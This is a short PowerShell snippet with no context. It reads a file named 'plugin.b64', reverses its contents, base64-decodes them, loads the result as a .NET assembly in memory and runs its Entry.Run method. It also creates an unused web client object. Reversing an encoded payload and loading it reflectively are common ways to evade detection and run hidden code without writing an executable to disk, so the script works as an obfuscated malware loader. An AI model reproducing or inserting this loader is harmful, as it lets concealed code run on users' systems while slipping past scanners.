$web = New-Object Net.WebClient
$text = [IO.File]::ReadAllText('plugin.b64')
$chars = ($text.ToCharArray())[($text.Length - 1)..0]
$bytes = [Convert]::FromBase64String(-join $chars)
$module = [Reflection.Assembly]::Load($bytes)
$method = $module.GetType('Entry').GetMethod('Run')
$method.Invoke($null, $null)
